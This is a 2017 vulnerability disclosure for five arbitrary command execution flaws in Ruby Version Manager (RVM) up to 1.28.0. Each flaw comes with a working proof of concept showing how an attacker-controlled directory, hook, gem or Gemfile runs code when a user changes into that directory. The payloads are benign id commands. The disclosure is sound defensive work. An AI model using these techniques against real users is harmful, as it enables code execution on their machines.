The following issues constitute separate arbitrary command execution
vulnerabilities in RVM <=1.28.0

* CVE-2017-TBA RVM automatically loads environment variables from files in $PWD
* CVE-2017-TBA RVM command injection when automatically loading environment variables from files in $PWD
* CVE-2017-TBA RVM automatically executes hooks located in $PWD
* CVE-2017-TBA RVM automatically installs gems as specified by files in $PWD
* CVE-2017-TBA RVM automatically does "bundle install" on a Gemfile specified by .versions.conf in $PWD

Users should upgrade to RVM version 1.29.0

<https://en.wikipedia.org/wiki/Ruby_Version_Manager> says:

> Ruby Version Manager, often abbreviated as RVM, is a unix-like software
> platform designed to manage multiple installations of Ruby on the same
> device.
>
> [...]
>
> The different versions can then be switched between to enable a developer to
> work on several projects with different version requirements.

The vulnerabilities can be exploited in the event that a user with RVM loaded
into their shell uses `cd` to change into a directory where that directory's
contents are controlled by an attacker.

This could arise in the following scenarios:

* Where an attacker controls a directory on a multi-user system (e.g. within
  `/tmp/`) that a user can be convinced to `cd` into

* Where an attacker can provide a tarball that a user can be convinced to
  extract to a directory then `cd` into

* Where an attacker controls a git repo which a user can be convinced to clone
  and then `cd` into

* Where an attacker can use a web application to upload arbitrary files with
  arbitrary filenames, then wait for an administrator to `cd` into the
  directory that the user uploaded the files to.

Other scenarios are left as an exercise for the reader.

All examples below were captured using RVM 1.27.0

CVE-2017-TBA RVM automatically loads environment variables from files in $PWD
-----------------------------------------------------------------------------

* Private disclosure date: 2016-10-28
* Public disclosure date: 2017-02-15
* Vendor advisory: TBA
* Affected versions: <=1.28.0

RVM, by default, hooks `cd` and automatically detects the presence of certain
files in the directory being changed to. These files and their mechanics are
detailed at <https://rvm.io/workflow/projects>.

The code that parses these files is available at
<https://github.com/rvm/rvm/blob/master/scripts/functions/rvmrc_project> (look
for the `__rvm_load_project_config` function). The code, as of a vulnerable
commit, is available at
<https://github.com/rvm/rvm/blob/b04c0158d/scripts/functions/rvmrc_project#L61>.

The parsing of these files allows for the exporting of arbitrary environment
variables into the current shell. For example, to set the environment variable
`FOO` to the value `"bar"`:

* `.versions.conf` should contain the line `"env-FOO=bar"`; OR

* `Gemfile` should contain the line `"#ruby-env-FOO=bar"` (Note that the
  parsing of `Gemfile` throws a notice in the user's shell); OR

* `.ruby-version`, `.rbfu-version` or `.rbenv-version` should be accompanied by
  a file named `.ruby-env` which should contain the line `"FOO=bar"`

In all of the above cases, it is critical that the file also specifies a
version of Ruby that satisfies RVM. This may be a version of Ruby that the user
has installed via RVM, or it may be the magic value `"system"` to specify that
the base system's Ruby should be used. This always satisfies RVM, even when
there is no Ruby installed on the base system.

An example of setting an environment variable using `.versions.conf`:

```text
rvm@773eb63af1cc:~$ mkdir test

rvm@773eb63af1cc:~$ cat > test/.versions.conf
ruby=system
env-FOO=bar
^D

rvm@773eb63af1cc:~$ echo $FOO


rvm@773eb63af1cc:~$ cd test

rvm@773eb63af1cc:~/test$ echo $FOO
bar
```

This behaviour can be used to achieve arbitrary command execution when a user
changes into a directory with malicious contents. For example, modern shells
will automatically interpret shell metacharacters within `PS1`. Other
techniques are left as an exercise for the reader.

### POC

```text
rvm@e6aeaf6d79ec:~$ mkdir poc

rvm@e6aeaf6d79ec:~$ cat > poc/.versions.conf
ruby=system
env-PS1=\n$(echo "Command execution as $(id) via PS1")\n\n$PS1
^D

rvm@e6aeaf6d79ec:~$ cd poc

Command execution as uid=1000(rvm) gid=1000(rvm) groups=1000(rvm) via PS1

rvm@e6aeaf6d79ec:~/poc$
```

CVE-2017-TBA RVM command injection when automatically loading environment variables from files in $PWD
------------------------------------------------------------------------------------------------------

* Private disclosure date: 2016-10-29
* Public disclosure date: 2017-02-15
* Vendor advisory: TBA
* Affected versions: <=1.28.0

RVM, by default, hooks `cd` and automatically detects the presence of certain
files in the directory being changed to. These files and their mechanics are
detailed at <https://rvm.io/workflow/projects>.

The code that parses these files is available at
<https://github.com/rvm/rvm/blob/master/scripts/functions/rvmrc_project> (look
for the `__rvm_load_project_config` function). The code, as of a vulnerable
commit, is available at
<https://github.com/rvm/rvm/blob/b04c0158d/scripts/functions/rvmrc_project#L61>.

The parsing of these files allows for the exporting of environment variables
into the current shell. For example, to set the environment variable `FOO` to
the value `"bar"`:

* `.versions.conf` should contain the line `"env-FOO=bar"`

* `Gemfile` should contain the line `"#ruby-env-FOO=bar"` (Note that the
  parsing of `Gemfile` throws a notice in the user's shell)

* `.ruby-version`, `.rbfu-version` or `.rbenv-version` should be accompanied by
  a file named `.ruby-env` which should contain the line `"FOO=bar"`

In all of the above cases, it is critical that the file also specifies a
version of Ruby that satisfies RVM. This may be a version of Ruby that the user
has installed via RVM, or it may be the magic value `"system"` to specify that
the base system's Ruby should be used. This always satisfies RVM, even when
there is no Ruby installed on the base system.

An example of setting an environment variable using `.versions.conf`:

```text
rvm@773eb63af1cc:~$ mkdir test

rvm@773eb63af1cc:~$ cat > test/.versions.conf
ruby=system
env-FOO=bar
^D

rvm@773eb63af1cc:~$ echo $FOO


rvm@773eb63af1cc:~$ cd test

rvm@773eb63af1cc:~/test$ echo $FOO
bar
```

The code that parses environment variables fails to properly sanitize data
before using it in an `eval` statement, leading to command injection. The buggy
code, as of a vulnerable commit, is available at
<https://github.com/rvm/rvm/blob/b04c0158d/scripts/functions/rvmrc_project#L271-L320>

The code wraps the value (e.g. `bar` as per the example above) in double-quotes
and performs escaping on key shell metacharacters by prefixing them with `\`.
However, instances of `\` itself in the value are not escaped. A metacharacter
becomes properly escaped, but a metacharacter preceded by a backslash becomes
an escaped backslash followed by the metacharacter. For example:

* `bar$(id)` becomes `"bar\$(id)"` which is safe
* `bar\$(id)` becomes `"bar\\$(id)"` which causes execution of the `id` command.

This behaviour can be used to achieve arbitrary command execution when a user
changes into a directory with malicious contents.

### POC

```text
rvm@e6aeaf6d79ec:~$ mkdir poc

rvm@e6aeaf6d79ec:~$ cat > poc/.versions.conf
ruby=system
env-FOO=bar\$(sh -c 'echo; echo Command injection as:; id; echo' >&2)
^D

rvm@e6aeaf6d79ec:~$ cd poc

Command injection as:
uid=1000(rvm) gid=1000(rvm) groups=1000(rvm)

rvm@e6aeaf6d79ec:~/poc$
```

CVE-2017-TBA RVM automatically executes hooks located in $PWD
-------------------------------------------------------------

* Private disclosure date: 2016-10-29
* Public disclosure date: 2017-02-15
* Vendor advisory: TBA
* Affected versions: <=1.28.0

RVM, by default, hooks `cd` and automatically executes various auxiliary hooks
when a user changes into a directory. The mechanics of these additional
`after_cd` hooks are detailed at <https://rvm.io/workflow/hooks>.

What this page fails to mention is that hooks, as of a vulnerable version, are
not only loaded from `~/.rvm/hooks` but are also loaded from `$PWD/.rvm/hooks`
as per the code, as of a vulnerable commit, at
<https://github.com/rvm/rvm/blob/b04c0158d/scripts/hook#L23-L27>.

This behaviour can be used to achieve arbitrary command execution when a user
changes into a directory with malicious contents.

Note that hook files must be executable for them to be triggered.

### POC

```text
rvm@e6aeaf6d79ec:~$ mkdir -p poc/.rvm/hooks

rvm@e6aeaf6d79ec:~$ cat > poc/.rvm/hooks/after_cd_poc
#!/bin/sh
echo "Command execution as $(id)"
^D

rvm@e6aeaf6d79ec:~$ chmod a+x poc/.rvm/hooks/after_cd_poc

rvm@e6aeaf6d79ec:~$ cd poc

Command execution as uid=1000(rvm) gid=1000(rvm) groups=1000(rvm)
rvm@e6aeaf6d79ec:~/poc$
```

CVE-2017-TBA RVM automatically installs gems as specified by files in $PWD
--------------------------------------------------------------------------

* Private disclosure date: 2016-10-31
* Public disclosure date: 2017-02-15
* Vendor advisory: TBA
* Affected versions: <=1.28.0

RVM, by default, hooks `cd` and automatically parses a file named
`.versions.conf` in the directory being changed to. This file can provide the
names of arbitrary gems, via `ruby-gem-install` entries, which will be
automatically passed to `gem install` upon `cd` into the directory. The code
responsible, as of a vulnerable commit, is available at
<https://github.com/rvm/rvm/blob/b04c0158d/scripts/functions/rvmrc_project#L100>.

This behaviour can be used to achieve immediate installation of an arbitrary
Ruby gem. This can be used to gain immediate Ruby code execution if that gem
defines a `post_install` hook. Furthermore, the gem can be located in `$PWD`,
making this a fully self-contained attack.

Thanks to <http://stackoverflow.com/a/33739910> for detailing the
`post_install` hook trick.

It is critical that `.versions.conf` specifies a version of Ruby that satisfies
RVM and will allow the user to successfully install gems. This may be a version
of Ruby that the user has installed via RVM, or it may be the magic value
`"system"` to specify that the base system's Ruby should be used (Note that
Ruby must be installed on the base system). If the magic value `"system"` is
used, then the user must be privileged so that the installation of the gem to
the system gem location can succeed. Hence, exploitation of an unprivileged
user is generally only possible when the user has installed a Ruby via RVM and
the exact version is known.

### POC

Install a known version of ruby via RVM:

```text
rvm@e6aeaf6d79ec:~$ rvm install 2.3.0
  [... SNIP ...]
```

Prepare a malicious gem that will trigger execution of Ruby code upon
installation:

```text
rvm@e6aeaf6d79ec:~$ mkdir -p poc-gem/lib/

rvm@e6aeaf6d79ec:~$ cat > poc-gem/poc-gem.gemspec
Gem::Specification.new do |s|
  s.name        = '.poc-gem'
  s.version     = '1.33.7'
  s.summary     = 'poc'
  s.authors     = ['A. Hacker']
  s.files       = ['lib/rubygems_plugin.rb']
end
^D

rvm@e6aeaf6d79ec:~$ cat > poc-gem/lib/rubygems_plugin.rb
Gem.post_install do
  File.open('/tmp/poc_output', 'w') {|f| f.write("Arbitrary ruby code execution as #{`id`}")}
end
^D

rvm@e6aeaf6d79ec:~$ cd poc-gem/

rvm@e6aeaf6d79ec:~/poc-gem$ gem build poc-gem.gemspec
WARNING:  licenses is empty, but is recommended.  Use a license identifier from
http://spdx.org/licenses or 'Nonstandard' for a nonstandard license.
WARNING:  no email specified
WARNING:  no homepage specified
WARNING:  See http://guides.rubygems.org/specification-reference/ for help
  Successfully built RubyGem
  Name: .poc-gem
  Version: 1.33.7
  File: .poc-gem-1.33.7.gem
```

Prepare a directory that will trigger installation of the malicious gem upon
`cd`:

```text
rvm@e6aeaf6d79ec:~/poc-gem$ cd ..

rvm@e6aeaf6d79ec:~$ mkdir poc

rvm@e6aeaf6d79ec:~$ cp poc-gem/.poc-gem-1.33.7.gem poc/

rvm@e6aeaf6d79ec:~$ cat > poc/.versions.conf
ruby=ruby-2.3.0
ruby-gem-install=.poc-gem-1.33.7.gem
^D
```

Trigger the POC:

```text
rvm@e6aeaf6d79ec:~$ cat /tmp/poc_output
cat: /tmp/poc_output: No such file or directory

rvm@e6aeaf6d79ec:~$ cd poc
installing gem .poc-gem-1.33.7.gem --no-ri --no-rdoc.

rvm@e6aeaf6d79ec:~/poc$ cat /tmp/poc_output
Arbitrary ruby code execution as uid=1000(rvm) gid=1000(rvm) groups=1000(rvm)
```

CVE-2017-TBA RVM automatically does "bundle install" on a Gemfile specified by .versions.conf in $PWD
-----------------------------------------------------------------------------------------------------

* Private disclosure date: 2016-11-07
* Public disclosure date: 2017-02-15
* Vendor advisory: TBA
* Affected versions: <=1.28.0

RVM, by default, hooks `cd` and automatically parses a file named
`.versions.conf` in the directory being changed to. The intention seems to be
that, if the user's `${rvm_autoinstall_bundler_flag}` setting is enabled, then
`.versions.conf` can specify a Gemfile that will automatically be fed to
`bundle install`. Due to an erroneous conditional that uses `||` (OR) instead
of `&&` (AND), `.versions.conf` can provide the name of an arbitrary Gemfile
that will automatically be fed to `bundle install` regardless of the state of
`${rvm_autoinstall_bundler_flag}`. The code responsible, as of a vulnerable
commit, is available at
<https://github.com/rvm/rvm/blob/b04c0158dbadc9a999a2af4f39bc008976b9ebf1/scripts/functions/rvmrc_project#L102-L113>.

This behaviour can be used to achieve immediate ruby code execution upon `cd`
into a malicious directory since Gemfiles are interpreted using Ruby
<https://github.com/bundler/bundler/issues/5178>

### POC

```text
rvm@e6aeaf6d79ec:~$ mkdir poc

rvm@e6aeaf6d79ec:~$ cat > poc/.versions.conf
ruby=ruby-2.3.0
ruby-bundle-install=.doot
^D

rvm@e6aeaf6d79ec:~$ cat > poc/.doot
`echo "Arbitrary ruby code execution as $(id)" >&2`
^D

rvm@e6aeaf6d79ec:~$ cd poc
installing gem bundler --no-ri --no-rdoc.
Arbitrary ruby code execution as uid=1000(rvm) gid=1000(rvm) groups=1000(rvm)
The Gemfile specifies no dependencies
Resolving dependencies...
Bundle complete! 0 Gemfile dependencies, 1 gem now installed.
Use `bundle show [gemname]` to see where a bundled gem is installed.
```

---

Justin Steven

<https://twitter.com/justinsteven>
